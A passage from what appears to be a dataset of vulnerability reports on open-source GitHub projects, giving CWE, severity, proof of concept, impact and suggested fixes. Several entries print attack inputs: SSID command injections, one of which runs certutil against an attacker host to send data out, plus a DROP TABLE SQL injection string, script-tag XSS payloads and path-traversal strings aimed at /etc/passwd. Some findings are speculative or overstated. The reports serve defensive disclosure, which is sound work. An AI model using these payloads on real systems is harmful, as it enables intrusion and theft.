The contents of /etc/shadow will be sent to the attacker’s server.

Impact:
An attacker exploiting this can achieve full remote-code execution under the Proxy Manager user, leading to complete compromise of the host. Confidential data (password hashes, application secrets) can be stolen, files and configurations can be modified or deleted, services can be disrupted, backdoors can be installed, and the attacker can pivot to other systems in the network.

Mitigation:
Upgrade to Nginx Proxy Manager 2.11.3 or later, where file operations for certificates are performed using safe Node.js filesystem APIs (fs.writeFileSync and fs.unlink) instead of shell commands. Never build shell command strings by concatenating user input; use execFile or spawn with argument arrays or direct filesystem calls to avoid invoking a shell. Secure the certificate-management interface by limiting access to trusted administrators."
112,1745818868086,https://github.com/sebhildebrandt/systeminformation.git,CWE-94,Critical,2025-04-28T05:41:08.000Z,2025-04-28T06:16:49.000Z,"The vulnerability is an OS command-injection in the Windows wireless-network code. In lib/network.js, the library runs shell commands like

execSync(`netsh wlan show profiles ""${SSID}"" | findstr ""802.1X""`, …)

where SSID is taken verbatim from the name of the connected Wi-Fi network. Because it’s interpolated directly into a double-quoted shell string without escaping, a malicious SSID containing characters like ""; or & can break out of the intended command and run whatever the attacker wants 

Exploitable scenarios:

Malicious SSID injection via rogue hotspot
An attacker hosts a Wi-Fi network named:

EvilNet""; calc.exe & echo ""
When systeminformation.networkInterfaces() is called, execSync executes

netsh wlan show profiles ""EvilNet""; calc.exe & echo """" | findstr ""802.1X""

causing calc.exe (or any chosen command) to run on the victim’s machine.

File creation or modification
SSID:
DropFile""; echo hacked > C:\Users\Public\hacked.txt & echo ""
leads to creation of hacked.txt in the public folder.

Data exfiltration or credential harvest
SSID:
Leak""; certutil -urlcache -split -f http://attacker/$(whoami).txt & echo ""
runs certutil to upload local user info to an external server.

Impact:
Remote code execution on any Windows host that calls into this library to enumerate Wi-Fi profiles.

Runs with the same privileges as the Node.js process (often Administrator or SYSTEM in desktop apps), so it can install malware, modify system files, disable defenses, or move laterally.

Any application using this library on Windows is at risk simply by connecting to or scanning for attacker-controlled wireless networks.

This was fixed by trimming and sanitizing the SSID string (.trim() and util.sanitizeShellString) before passing it to execSync, ensuring no untrusted characters can reach the shell "
113,1745825637086,hylinux1024/datingtoday/blob/c2dbe0d7ca2231e86b48a877f159a3ea7bd45720/api/auth.py#L84,CWE-327: Use of broken or risky cryptographic algorithm,Medium,2025-04-29T04:40:00.000Z,2025-04-29T05:42:44.000Z,"POC:
Vulnerable code line:
md5 = hashlib.md5()  # Line 84

Steps to Reproduce:
Inspect the generate_token function in api/auth.py.
Observe that MD5 is used for token generation, which is considered cryptographically insecure.
Note that MD5 creates a risk of collision attacks, potentially allowing unauthorized access.

Root Cause:
The generate_token function uses MD5, a cryptographic algorithm that is no longer considered secure for cryptographic purposes.
Vulnerable code
md5 = hashlib.md5()  # Line 84

Exploit Scenario:
An attacker could exploit MD5’s vulnerability to collision attacks to generate a token that matches an existing user’s token, potentially gaining unauthorized access.
Vulnerable code:
md5 = hashlib.md5()  # Line 84

Why It Happens:
The application employs an outdated cryptographic algorithm (MD5) instead of using modern secure alternatives.

Security Implications:
Exploitation can lead to:
      1. Collision attacks, where two different inputs produce the same hash.
      2. Unauthorized access to sensitive user accounts.

Suggested fix:

import hashlib
import os

sha256 = hashlib.sha256()
rand = os.urandom(32)
sha256.update(str(rand).encode('UTF-8'))
token = sha256.hexdigest()"
114,1745825998143,hylinux1024/datingtoday/blob/c2dbe0d7ca2231e86b48a877f159a3ea7bd45720/api/auth.py#L64,CWE-330 : Use of insufficiently random values,High,2025-04-29T04:31:15.000Z,2025-04-29T05:43:52.000Z,"POC:-
Vulnerable code

code = '97532'  # Line 64

Clone the repository:

git clone https://github.com/hylinux1024/datingtoday.git
cd datingtoday

Locate the send_sms function in api/auth.py.
Trigger the /api/auth/sendsms endpoint by making a POST request with a valid phone number:

curl -X POST -d ""phone=1234567890"" http://127.0.0.1:5000/api/auth/sendsms

Observe that the hardcoded SMS code '97532' is returned consistently, making it predictable and exploitable.

Root Cause:
The code uses a static and predictable SMS verification code instead of dynamically generating a secure random code.
Vulnerable code:
def send_sms():
    phone = request.form.get('phone')
    m = re.match(pattern_phone, phone)
    if not m:
        return make_response_error(300, 'phone number format error.')
    # 这里需要修改为对接短信服务
    code = '97532'
    key = f'{phone}-{code}'
    r.set(key, code, 60)
    return make_response_ok({'phone': phone, 'code': code})

Exploit Scenario:
An attacker can always use the hardcoded SMS code (97532) to bypass the SMS verification process, gaining unauthorized access to an account.
Vulnerable code:
def send_sms():
    phone = request.form.get('phone')
    m = re.match(pattern_phone, phone)
    if not m:
        return make_response_error(300, 'phone number format error.')
    # 这里需要修改为对接短信服务
    code = '97532'
    key = f'{phone}-{code}'
    r.set(key, code, 60)
    return make_response_ok({'phone': phone, 'code': code})

Why It Happens:
The application does not generate SMS codes dynamically or use a secure method to create unique codes for each request.

Security Implications:
Exploitation can lead to:
1. Complete bypass of SMS verification security control
2. Unauthorized account access and takeover
3. Mass account creation for spam/fraud purposes
4.Compromise of user privacy and personal data

Suggested fix:

import random
code = f""{random.randint(10000, 99999)}""
r.set(key, code, ex=60)  # 60 seconds expiration"
115,1745831438272,https://github.com/samir-k1/bg-vlog/blob/master/src/BlogList.jsx,"CWE-601, CWE-138",High,2025-04-28T09:10:38.000Z,2025-04-29T01:28:51.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

CWE-138 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')

Proof of Concept:
Vulnerable Code:

<Link to={`blog/${blog.id}`}>
blog.id is directly injected into the URL without validation or sanitization.

If an attacker manipulates blog.id to include malicious inputs like javascript:alert('XSS'), it could break routing or trigger client-side JavaScript execution.

Steps to Exploit:

Insert a malicious id like javascript:alert(1) into the blog data.

When rendered, the <Link> will point to blog/javascript:alert(1).

Clicking the link can trigger script execution or redirect users to unsafe pages.

Severity:
High
(If it allows Open Redirects or client-side XSS via malicious URLs.)

Root Cause:
The vulnerability occurs because the code dynamically builds URLs using user-controlled input (blog.id) without validating or sanitizing it. React Router treats the input as part of the navigation path without enforcing any restrictions on its content, allowing malicious payloads.

Exploit Scenario:
An attacker submits a blog with an ID such as //malicious-site.com or javascript:alert('XSS'). When a user clicks on the blog link, they could either be redirected to a malicious website or unknowingly execute attacker-controlled JavaScript code within their browser.

Why It Happens:
The code assumes that blog.id will always be a safe, well-formed identifier. However, without proper validation, malicious or malformed input can be introduced, leading to improper construction of navigation URLs and unsafe user redirection or script injection.

Security Implications:
If exploited, an attacker could:

Redirect users to phishing sites.

Execute JavaScript in the victim’s browser (XSS).

Break the application's navigation flow.

Launch broader attacks like session hijacking, data theft, or malware delivery.

This compromises the security and trust of the application significantly.

Suggested Fix:
Strictly validate blog.id using a whitelist pattern (e.g., allow only alphanumeric characters, dashes, and underscores).

Reject or sanitize any ID that does not match the expected format.

Alternatively, encode or safely handle dynamic path parameters to prevent injection attacks.

Example validation:

const safeId = /^[a-zA-Z0-9-_]+$/.test(blog.id) ? blog.id : 'invalid-id';
<Link to={`blog/${safeId}`}>
Additionally, enforce ID validation and sanitization server-side as well to prevent injection at the data source.

"
116,1745840289983,https://github.com/vidhi-github/wanderlust-project/blob/main/controllers/reviews.js,"CWE-862, CWE-915",High,2025-04-28T11:38:09.000Z,2025-04-29T01:25:12.000Z,"Vulnerability Type:
CWE-862: Missing Authorization

CWE-915: Improper Input Validation

(Also relates to OWASP A01:2021 - Broken Access Control and OWASP A03:2021 - Injection)

Proof of Concept:
Vulnerable Code (Destroy Review):

await Listing.findByIdAndUpdate(id, { $pull: { reviews: reviewId } });
await Review.findByIdAndDelete(reviewId);
No check if the current user owns the review before deleting.

Any logged-in user can delete any review if they know its ID.

Vulnerable Code (Create Review):

let newReview = new Review(req.body.review);
Directly trusts req.body.review without validating fields.

Attackers can inject MongoDB operators or invalid data.

Severity:
High
(Authorization bypass + potential for stored XSS or NoSQL injection.)

Root Cause:
The system does not verify whether the user performing the delete operation is the rightful owner of the review. Additionally, it does not validate or sanitize user-supplied input before saving it to the database, allowing potential injection attacks or corrupted data insertion.

Exploit Scenario:
An attacker creates a fake account, retrieves a valid reviewId from another user's listing, and sends a forged DELETE request to /listings/:id/reviews/:reviewId. The review, which does not belong to them, gets deleted. Similarly, attackers can submit malformed review data containing $gt or <script> tags to corrupt the database or launch cross-site scripting attacks.

Why It Happens:
The code improperly assumes that any logged-in user is authorized to delete a review and that all incoming review inputs are trustworthy. No ownership checks are performed on sensitive operations, and no input validation mechanisms are used for review creation.

Security Implications:
If exploited, attackers can delete other users' reviews, leading to loss of user data, undermining trust in the application, and potential defacement. Maliciously crafted reviews could inject JavaScript (XSS) or MongoDB payloads (NoSQL injection), allowing attackers to hijack user sessions or crash the application backend.

Suggested Fix:
Before deleting a review, verify that review.author === req.user._id to ensure only the creator can delete their review.

Add strict server-side validation and sanitization of the review object (e.g., use express-validator).

Escape or strip dangerous HTML from user input to prevent XSS.

Use error handling to prevent crashes from malformed review IDs.

Implement CSRF protection if not already done.

Example ownership check:

const review = await Review.findById(reviewId);
if (!review.author.equals(req.user._id)) {
  req.flash(""error"", ""Unauthorized to delete this review."");
  return res.redirect(`/listings/${id}`);
}
Example input validation:

const { body } = require('express-validator');
exports.validateReview = [
  body('review.body').trim().isLength({ min: 1 }).escape()
];"
117,1745841507716,directus/directus/blob/main/api/src/services/access.ts,CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes,High,2025-04-28T11:58:27.000Z,2025-04-29T00:03:27.000Z,"Vulnerability Type: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

Proof of Concept:
Vulnerable Code:
const result = await super.createOne(data, opts);
const result = await super.updateMany(keys, data, opts);

1. The `data` object is passed directly to `super.createOne()` and `super.updateMany()`.
2. No field validation or sanitization is performed at the service level.
3. If a user submits unexpected fields like `is_admin`, `system_flags`, or others, they could modify critical system records unintentionally or maliciously.
4. If the base `ItemsService` does not restrict this either, full privilege escalation is possible.
Severity: 4 – High
Root Cause: The AccessService class relies on untrusted input without sanitizing or whitelisting allowed fields, trusting that upstream services will validate the structure. This opens a path for mass assignment attacks by malicious users inserting unauthorized fields.
Exploit Scenario: An attacker sends a crafted payload to the access control endpoints with extra fields, like setting `is_admin: true`, `permissions: ""*""` during a create or update action. If unfiltered, these fields could be written directly to the database, resulting in unauthorized privilege escalation or broken access control.
Why It Happens: This occurs because the service class does not enforce strict server-side validation on incoming `data` objects before interacting with critical internal services. Assumed that upstream input validation was sufficient, leaving the service layer unprotected.
Security Implications: If exploited, attackers could escalate privileges, modify access control roles, delete important system permissions, or even fully compromise the administrative layer of the application. This could result in data exfiltration, unauthorized system control, or destruction of critical app functionality.
Suggested Fix: Implement strict field-level whitelisting to filter out any unexpected attributes from user-supplied `data` before passing it into `createOne` and `updateMany`. Only explicitly allowed fields (`role`, `collection`, `action`, `permissions`) should be accepted. All other fields must be ignored or rejected."
118,1745844192269,https://github.com/shoulders/qwcrm/blob/master/src/components/_includes/Company.php,"CWE-22, CWE-23",Critical,2025-04-28T12:43:12.000Z,2025-04-29T01:16:34.000Z,"Vulnerability Analysis for Company.php
Vulnerability Type:
CWE-22/23: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
[line 396]
Proof of Concept (Elaborated):
Vulnerable Code:
unlink($logo_file);

Step-by-Step Explanation:
1.	Problem:
The $logo_file variable comes from user input or data influenced by user input and is passed directly to the unlink() function.
2.	No Path Validation:
There are no checks or sanitization of $logo_file to ensure it stays within a specific safe directory.
3.	How to Attack:
If an attacker can control the $logo_file path (or partially influence it), they could supply a value like:
4.	../../../../etc/passwd
leading unlink() to attempt to delete sensitive system files.
5.	Effect:
o	Arbitrary file deletion on the server
o	Possible Denial of Service (DoS)
o	Critical application files or configuration files could be removed

Example Exploit:
Malicious Input:
../../../../var/www/html/config.php
Backend Action:
unlink('../../../../var/www/html/config.php');
Result:
Server deletes critical application configuration file, causing service disruption or requiring full reinstallation.

Severity:Critical (Arbitrary File Deletion → Denial of Service)

Root Cause:
The application directly uses user-controlled data as the file path in unlink() without validating that it belongs to an allowed directory.

Exploit Scenario:
An attacker manipulates $logo_file to reference critical files outside the intended directory, and when unlink() is called:
•	Deletes web server files
•	Deletes environment files (.env)
•	Deletes application source code
•	Causes application crash or unavailability

Why It Happens:
Because the server trusts file paths from external input without verifying if the resolved path points to a safe or expected location before deletion.

Security Implications:
If exploited:
•	Critical files can be deleted, causing denial of service.
•	Configuration leaks (removing security configs)
•	Server reconfiguration required after attack.
•	Potential privilege escalation if combined with other vulnerabilities.

Suggested Fix:
--- Company.php	2025-04-27
+++ Company_fixed.php	2025-04-27
@@
+ $safe_base_dir = '/var/www/uploads/logos'; // Define a secure base directory

 $logo_path = $logo_file;
-$result = unlink($logo_path);
+ $real_path = realpath($logo_path);
+ if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {
+     // Invalid file path detected, abort
+     error_log('Blocked unlink attempt on invalid path: ' . $logo_path);
+ } else {
+     $result = unlink($real_path);
+ }



"
119,1745845218959,jerryscript-project/jerryscript/blob/master/jerry-core/parser/js/js-parser.c,CWE-122,Critical,2025-04-28T13:00:18.000Z,2025-04-29T01:49:15.000Z,"Vulnerability Type: CWE-122: Heap-Based Buffer Overflow

Proof of Concept: 
In the JerryScript project, inside 

https://github.com/jerryscript-project/jerryscript/blob/master/jerry-core/parser/js/js-parser.c

The function `parser_compute_indicies`  incorrectly handles memory pointers when computing literal indices. 
Specifically, the `char_p` pointer is taken from `literal_p->u.char_p` and used in pointer arithmetic without verifying that it points inside the valid source buffer (`context_p->source_start_p` to `context_p->source_end_p`). 
If an attacker provides a malicious input that manipulates parsing, it is possible for `char_p` to point out-of-bounds, causing unsafe memory reads or writes.

Vulnerable snippet:

Line: 112
```
const uint8_t *char_p = literal_p->u.char_p;
if ((literal_p->status_flags & LEXER_FLAG_SOURCE_PTR) && literal_p->prop.length < 0xfff)
{
    size_t bytes_to_end = (size_t) (context_p->source_end_p - char_p);

    if (bytes_to_end < 0xfffff)
    {
        literal_p->u.source_data = ((uint32_t) bytes_to_end) | (((uint32_t) literal_p->prop.length) << 20);
    }
}
```
There is no check that `char_p` is within the valid source bounds, leading to heap corruption if it is manipulated.

OWASP Top 10 Category: A03:2021 – Injection

Severity: Critical (Level 5)

Root Cause: Missing bounds validation when computing memory offset between user-controlled pointers and legitimate buffers.

Exploit Scenario: An attacker crafts a malformed JavaScript source that corrupts the `lexer_literal_t` structure to make `char_p` point outside the legitimate source buffer, leading to heap memory corruption during parsing.

Why It Happens: Unsafe assumptions about the validity of internal pointers derived from user-controlled input without proper runtime validation.

Security Implications: Successful exploitation could lead to heap overflows, denial of service (application crash), memory disclosure, or remote code execution depending on memory layout and compilation options.

Suggested Fix: Before using `char_p`, validate that `char_p >= context_p->source_start_p` and `char_p <= context_p->source_end_p` to ensure safe pointer arithmetic."
120,1745845257782,https://github.com/shoulders/qwcrm/blob/master/src/themes/default/js/components/workorder.js,CWE-79,Medium,2025-04-28T13:00:57.000Z,2025-04-29T01:11:56.000Z,"Vulnerability Analysis for workorder.js
Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept (Elaborated):
Vulnerable Code:
$('#autoSuggestionsList').html(data);

Step-by-Step Explanation:
1.	Problem:
data is fetched from a server-side API (autosuggest_scope) and directly inserted into the DOM using .html() without any sanitization.
2.	How to Attack:
If an attacker can control or inject malicious payloads into the data returned from the server, it would get rendered directly as HTML, and any <script> inside would execute.
3.	Effect:
o	Arbitrary JavaScript Execution
o	Session Hijacking
o	Phishing attacks
o	Complete compromise of the user session

Example Exploit:
If data returned by the server is:
<li><script>alert('XSS by attacker')</script></li>
When inserted into:
$('#autoSuggestionsList').html(data);
Result:
•	Script executes immediately
•	Attacker gains control over the page context

Severity:
Critical (Stored or Reflected DOM XSS → Full Session Hijack)

Root Cause:
The application blindly trusts the content received from the server and injects it into the DOM using .html() without validation, escaping, or sanitization.

Exploit Scenario:
An attacker tricks the server into responding with a malicious payload by injecting data into scope_input_string, or compromises the server response.
When users interact with the auto-suggestion feature, the injected JavaScript code will execute in their browsers.

Why It Happens:
Because no content sanitization or escaping is performed before injecting dynamic content into the DOM via .html().

Security Implications:
If exploited:
•	Attacker can steal user cookies
•	Hijack user sessions
•	Perform CSRF or phishing attacks
•	Inject keyloggers or spyware into the application

Suggested Fix:
--- workorder.js	2025-04-27
+++ workorder_fixed.js	2025-04-27
@@
- $('#autoSuggestionsList').html(data);
+ $('#autoSuggestionsList').html(DOMPurify.sanitize(data));

"
121,1745845303518,lestec-al/files/blob/main/files_old.py,CWE-22,High,2025-04-28T13:01:43.000Z,2025-04-29T00:11:06.000Z,"Explanation:
The code allows user input (e.g., main_path, up_string, down_string) to be used directly in file system operations such as listing directories (os.listdir), copying files (shutil.copytree, shutil.copy2), deleting files (send2trash), and renaming files (os.rename) without any validation or sanitization of the path. This enables an attacker to supply crafted paths to access or manipulate arbitrary files outside the intended directory scope.


POC:
If an attacker can control the input for main_path or the paths used in copy/paste/delete/rename operations, they could specify a path like /etc/passwd or ../../../../etc/passwd to read or manipulate sensitive system files.


Root Cause: 
File: https://github.com/lestec-al/files/blob/main/files_old.py

Line 11: main_path = config['USER SETTINGS']['home_path'] - no validation on config input.
Lines 32, 33: files = os.listdir(dirname) and subsequent use of dirname from user input.
Lines 139-158: Copy and paste operations use source and destination derived from user input without validation.
Lines 160-171: Delete operation uses del_path from user input without validation.
Lines 172-193: Rename operation uses r_path from user input without validation.


Exploit Scenario:
An attacker modifies the files.ini configuration or manipulates the GUI input fields to specify paths outside the intended directory, enabling reading, copying, deleting, or renaming arbitrary files on the system.


Why it Happens:
Lack of input validation and sanitization on file paths allows directory traversal attacks.



Security Implications:
Unauthorized access to sensitive files.
Potential data leakage or corruption.
Arbitrary file deletion or overwriting critical system files.
Escalation to remote code execution if combined with other vulnerabilities.


Suggested Fix:
Validate and sanitize all file paths to ensure they are within an allowed base directory.
Use os.path.realpath() and verify the resolved path starts with the intended base directory.
Reject or sanitize any paths that attempt to traverse outside the allowed directory.

Patch fix snippet for path validation:

def is_safe_path(basedir, path):
    # Resolve absolute paths and check prefix
    return os.path.realpath(path).startswith(os.path.realpath(basedir))

# Example usage before any file operation:
if not is_safe_path(main_path, user_supplied_path):
    raise ValueError(""Invalid path detected: directory traversal attempt"")

Apply this check before any file operation involving user input paths."
122,1745846190363,Celestial-0/FILE-MANAGER/blob/main/project.py,CWE-434 ,High,2025-04-28T13:16:30.000Z,2025-04-29T00:13:45.000Z,"Explanation:
The application allows adding custom folders with user-defined extensions. There is no validation of extensions or file types, which could allow dangerous file types (e.g., executable scripts) to be moved into user-accessible folders.


POC:
A user adds a custom folder with extensions like .exe or .py and moves such files, possibly enabling execution of malicious code if accessed.


Root Cause: 
File https://github.com/Celestial-0/FILE-MANAGER/blob/main/project.py
Lines 64: on_add_custom_click method accepts arbitrary folder names and extensions without validation.


Exploit Scenario:
Malicious files get organized into accessible folders, potentially leading to execution or distribution of malware.


Why it Happens:
Lack of validation or whitelisting of allowed file extensions.


Security Implications:
Execution of malicious files, spreading malware. An attacker could upload malicious files to shared directories or directories of executables possibly leading to arbitrary command execution.


Suggested Fix with suggested code:
Implement a whitelist of allowed extensions or sanitize inputs:

Patch:

ALLOWED_EXTENSIONS = {'mp3', 'jpg', 'png', 'docx', 'mp4', ...}

folder_exts = [ext.strip().lower() for ext in self.custom_exts_input.value.split(',')]
if not all(ext in ALLOWED_EXTENSIONS for ext in folder_exts):
    self.show_error_dialog(""One or more file extensions are not allowed."")
    return"
123,1745847194879,https://github.com/justEhmadSaeed/Python-Sockets-File-Transfer,"CWE-319, CWE-284, CWE-20, CWE-362",High,2025-04-28T13:33:14.000Z,2025-04-29T00:07:37.000Z,"Explanation:
The provided Python socket server code has multiple security issues:
No Encryption or Authentication: The socket communication is done in plaintext without any encryption or authentication mechanism, exposing data to interception and unauthorized access.
Unrestricted File Access and Transfer: The server reads and sends a file (server-file.txt) without validating the client's identity or request. This could lead to unauthorized file access or data leakage.
No Input Validation or Sanitization: The server accepts any connection and immediately prints and processes data received from clients without validation, which could be exploited for injection or denial-of-service attacks.
Resource Management: The server does not handle exceptions or errors, which can lead to resource leaks or crashes under malicious or malformed inputs.
Potential Race Conditions or Socket Vulnerabilities: Although not directly exploitable here, using raw sockets without proper safeguards can be vulnerable to race conditions or socket-related vulnerabilities as documented in some CPython socket issues.



POC:
An attacker can connect to the socket server and intercept or manipulate the data sent between client and server since it is unencrypted.
An attacker can send arbitrary data, potentially causing unexpected behavior or denial of service.
If the file server-file.txt contains sensitive data, it is sent without any access control, allowing unauthorized data exfiltration.



Root Cause including line number and vulnerable code: 
File Server.py:
Line 1-3: Socket is created without any security layer (no SSL/TLS).
Line 14: Accepts any incoming connection without authentication.
Line 18: Receives data from client without validation (data = con.recv(1024)).
Line 20-25: Reads and sends a file without any access control or verification (file = open('server-file.txt', 'rb') and subsequent lines).
No exception handling or input sanitization throughout the code.



Exploit Scenario:
An attacker connects to the server socket, intercepts or injects malicious data because the connection is unencrypted and unauthenticated. They can also receive sensitive file contents without authorization. This can lead to data theft, unauthorized access, or denial of service by sending malformed data or overwhelming the server.



Why it Happens:
The code uses plain TCP sockets without encryption or authentication.
It blindly trusts all incoming connections and data.
No validation or error handling is implemented.
The file transfer mechanism does not enforce any access control or confidentiality.



Security Implications:
Data confidentiality is compromised due to plaintext transmission.
Unauthorized users can connect and retrieve sensitive files.
The server is vulnerable to denial-of-service attacks or resource exhaustion.
Potential for injection or buffer overflow attacks if input is not validated.


Suggested Fix:
Use SSL/TLS to encrypt socket communication with ssl module.
Implement authentication to verify clients before sending files.
Validate and sanitize all inputs from clients.
Add error handling and resource management (try-except-finally).
Restrict file access and avoid sending sensitive files without authorization.
Use concurrency (e.g., threading) to handle multiple clients safely.

Patched code snippet:

python
import socket
import ssl

# SSL context setup
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 8800))
sock.listen(10)
print('Secure socket is listening...')

while True:
    con, addr = sock.accept()
    try:
        # Wrap socket with SSL
        ssl_con = context.wrap_socket(con, server_side=True)
        print('Secure connection established with', addr)

        # Simple authentication example (expecting a password)
        ssl_con.send(b'Password: ')
        password = ssl_con.recv(1024).decode().strip()
        if password != 'expected_password':
            ssl_con.send(b'Authentication failed.\n')
            ssl_con.close()
            continue

        ssl_con.send(b'Authentication successful. Sending file...\n')

        with open('server-file.txt', 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                ssl_con.send(data)

        print('File has been transferred successfully.')
    except Exception as e:
        print(f'Error: {e}')
    finally:
        ssl_con.close()

This code adds SSL encryption, basic authentication, error handling, and safe file transfer to mitigate the identified security issues"
124,1745848178280,https://github.com/KetanSingh11/SimpleChatApp,CWE-829,Very Low,2025-04-28T13:49:38.000Z,2025-04-29T01:05:16.000Z,"Explanation: The server creates a new thread for every client connection without limiting the number of concurrent clients, which can probably exhaust server resources. Although the probability is low, multiple connections can trigger a crash.


POC: An attacker opens many connections, causing the server to spawn many threads and possibly crash.


Root Cause: multiChatServer.py
Line 21: Thread(target=handle_client, args=(client, client_address)).start() with no limit on thread count.


Exploit Scenario: Resource exhaustion by opening many connections.


Why it Happens: No connection throttling or thread pool management.


Security Implications: Denial of service due to resource exhaustion.


Suggested Fix:
Implement connection limits or use a thread pool executor with max workers:

Patch:

from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=50)  # limit to 50 clients

def accept_incoming_connections():
    while True:
        client, client_address = SOCK.accept()
        executor.submit(handle_client, client, client_address)"
125,1745849907138,https://github.com/mybizna/mybizna/blob/main/public/vendor/livewire/livewire.js,CWE-601,Critical,2025-04-28T14:18:27.000Z,2025-04-28T15:58:27.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
Proof of Concept (Elaborated):
Vulnerable Code: [line 4311]
window.location.href = response.url;
Step-by-Step Explanation:
1.	Problem:
The application directly trusts and uses response.url to redirect users without validating whether the URL is internal or external.
2.	How to Attack:
If an attacker can control or influence response.url, they can:
o	Redirect users to malicious sites
o	Perform phishing attacks
o	Steal user sessions or credentials
3.	Effect:
Users could be tricked into visiting a malicious third-party website that appears trustworthy because it originated from the legitimate application.
Example Exploit:
Suppose the server responds:
{ ""url"": ""https://evil-attacker.com/login"" }
The browser will execute:
window.location.href = ""https://evil-attacker.com/login"";
Result:
The user is redirected to the attacker's malicious page.
Severity:
High (Phishing, Account Takeover Risk)
Root Cause:
The code blindly trusts response.url without validating whether it's safe (i.e., belongs to the same domain or an allowed list).
Exploit Scenario:
An attacker submits crafted input that causes the server to respond with a malicious URL.
When a user clicks or triggers the action, they are silently redirected to the attacker’s domain, exposing them to phishing or malware.
Why It Happens:
Because the server or frontend does not verify that response.url points to a trusted, whitelisted location before redirecting the user.
Security Implications:
If exploited:
•	Users lose trust in the application.
•	Phishing attacks become easier.
•	Sensitive data (like passwords, tokens) can be stolen.
•	Reputation damage for the business.

Suggested Fix:
--- f88aea41-56e1-43d2-9e80-5735bec3585f.js	2025-04-27
+++ f88aea41-56e1-43d2-9e80-5735bec3585f_fixed.js	2025-04-27
@@
- window.location.href = response.url;
+ const allowedBase = window.location.origin; 
+ const targetUrl = new URL(response.url, allowedBase);
+ if (targetUrl.origin === allowedBase) {
+     window.location.href = targetUrl.href;
+ } else {
+     console.error('Blocked open redirect attempt to: ', targetUrl.href);
+ }
"
126,1745857739873,async-labs/saas/blob/master/saas/api/server/api/public.ts,CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),High,2025-04-28T16:28:59.000Z,2025-04-29T00:41:50.000Z,"Vulnerability Type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
Proof of Concept:
Vulnerable Code:
const { slug } = req.body;
const user = await User.getUserBySlug({ slug });
1. The server reads `slug` directly from `req.body` without validation or sanitization.
2. The `slug` is passed into `User.getUserBySlug()` without ensuring it contains only safe characters.
3. If `getUserBySlug` uses dynamic query building (string concatenation or unsafe interpolation), malicious SQL commands embedded in the slug can be executed.
4. An attacker could inject SQL like `'; DROP TABLE users; --` to destroy data.
Severity: 4 – High
Root Cause: The root cause is the lack of any input validation or sanitation on the `slug` parameter. User-supplied input is trusted and used directly in backend data queries, exposing the backend to SQL Injection risks if queries are not safely parameterized internally.
Exploit Scenario: An attacker sends a malicious request such as:
{
  ""slug"": ""'; DROP TABLE users; --""
}
to the `/get-user-by-slug` endpoint. If `getUserBySlug` concatenates SQL unsafely, the server would execute the injected SQL, potentially deleting critical user data from the database.
Why It Happens: This vulnerability occurs because the application does not validate the format, length, or type of the incoming `slug` field before using it in a database operation. Without enforcing strict input rules, unsafe characters can travel from user input directly into SQL commands.
Security Implications: Exploiting this vulnerability can allow attackers to read, modify, or delete database contents. This could lead to full data exfiltration, loss of critical user records, administrative compromise, or complete destruction of application functionality if critical tables are dropped.
Suggested Fix: Apply strict validation on the `slug` field using middleware such as `express-validator` to enforce that it is a simple alphanumeric string of acceptable length. Reject or sanitize any input that does not conform."
127,1745893716467,https://github.com/SAP-samples/kyma-runtime-samples/blob/main/saas-provisioning/cmd/api/main.go,CWE-400,High,2025-04-29T02:28:36.000Z,2025-04-29T03:12:43.000Z,"Vulnerability Type:
CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion') — Risk of Slowloris attack due to missing ReadHeaderTimeout in Go's http.Server.

Proof of Concept:
The code uses:

log.Fatal(http.ListenAndServe("":8000"", router))
directly without setting any timeout.
Because of this:

The server accepts incoming HTTP connections.

It waits indefinitely for the HTTP request header to complete.

No ReadHeaderTimeout is configured.

This allows an attacker to keep connections open by sending HTTP headers extremely slowly, eventually exhausting server resources like sockets and memory.

Severity:
HIGH

Root Cause:
The application uses Go's default http.ListenAndServe, which does not configure important timeout settings such as ReadHeaderTimeout.
Without an explicit timeout, the server holds connections open indefinitely even if headers are incomplete, leading to potential resource exhaustion under a Slowloris-style attack.

Exploit Scenario:
An attacker can initiate thousands of connections to the server and send headers one byte at a time, very slowly.
Because the server waits for complete headers without timing out, it keeps all these connections open, eventually exhausting the server's thread pool, memory, or network sockets.
As a result, legitimate users will be denied service.

Why It Happens:
The vulnerability occurs because the server relies on http.ListenAndServe, which does not enforce any timeout for reading HTTP request headers.
When no ReadHeaderTimeout is set, incomplete or maliciously slow HTTP requests can keep server resources busy indefinitely, leading to uncontrolled resource consumption.

Security Implications:
Exploitation of this vulnerability can cause:

Denial of Service (DoS) by exhausting server threads, sockets, and memory.

Legitimate users experiencing extreme delays or complete service unavailability.

Increased server costs and degraded overall system reliability under attack conditions.

Suggested Fix:
Replace http.ListenAndServe with a properly configured http.Server object, and explicitly set a ReadHeaderTimeout value, such as 5 seconds.
This forces incomplete or slow HTTP requests to timeout early, preventing resource exhaustion.
Example:

srv := &http.Server{
    Addr: "":8000"",
    Handler: router,
    ReadHeaderTimeout: 5 * time.Second,
}
log.Fatal(srv.ListenAndServe())
This ensures server resources are efficiently managed and protected against Slowloris attacks."
128,1745894832362,https://github.com/SAP/project-sailor/sailor/utils/oauth_wrapper/OAuthServiceImpl.py,CWE-347,Medium,2025-04-29T02:47:12.000Z,2025-04-29T03:08:29.000Z,"Vulnerability Type:
CWE-347: Improper Verification of Cryptographic Signature

Proof of Concept:
In the OAuth2Client code:


jwt.decode(encoded_token, options={'verify_signature': False})
is used to decode JWT tokens without verifying their signatures.
Thus, any token — even a forged or tampered one — would be accepted as valid.
An attacker could create arbitrary tokens to impersonate users or escalate privileges without needing the secret key.

Severity:
MEDIUM

Root Cause:
